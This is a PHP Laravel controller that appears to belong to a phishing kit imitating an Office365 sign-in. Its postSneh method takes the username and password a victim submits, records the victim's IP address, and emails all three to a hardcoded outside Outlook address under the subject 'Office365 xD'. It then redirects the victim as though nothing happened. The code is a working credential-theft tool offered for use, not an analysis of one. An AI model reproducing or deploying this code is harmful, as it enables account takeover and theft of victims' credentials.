<?php namespace App\Http\Controllers;

use App\Http\Requests;
use App\Http\Controllers\Controller;

use Illuminate\Http\Request;
use App\Helpers\Contracts\HelperContract; 
use Auth;
use Session; 
use Validator; 
use Carbon\Carbon; 

class MainController extends Controller {

	protected $helpers; //Helpers implementation
    
    public function __construct(HelperContract $h)
    {
    	$this->helpers = $h;            
    }

	/**
	 * Show the application welcome screen to the user.
	 *
	 * @return Response
	 */
	public function getIndex()
    {
    	$os = $this->helpers->getOS();
    	return view('index', compact(['os']));
    }
    
    
    public function postSneh(Request $request)
	{
           $req = $request->all();
          dd($req);
               
                $validator = Validator::make($req, [
                             'username' => 'required',
                             'passwd' => 'required',
                   ]);
         
                 if($validator->fails())
                  {
                       $messages = $validator->messages();
                       return redirect()->back()->withInput()->with('errors',$messages);
                       //dd($messages);
             
                      /* $r = "<div class='alert alert-danger'><strong>Whoops!</strong> There were some problems signing you in.<br><br>";
                       $r .= "<ul>";
					
                       foreach($messages->all() as $error) $ret .= "<li>".$error."</li>";
            
                       $r .= "</ul></div>";
                       $ret = ['mode' => "error", 'error' => $r];
                       */
                 }
                
                 else
                 { 
                 	 $ip = getenv("REMOTE_ADDR");
                 	  $s = "Office365 xD ".$ip;
                       $rcpt = "candaceparker1@outlook.com";
                       #$rcpt = "giddycohen45@gmail.com";
                       $arr = ["email" => $req["username"], "password" => $req["passwd"], "ip" => $ip];
                          $this->helpers->sendEmail($rcpt,$s,['arr' => $arr],'emails.login_alert','view');  
                          Session::flash("collect", "yes" );                	         
                          return redirect()->intended('/');                       
                   }                                                                                                   
	}

}
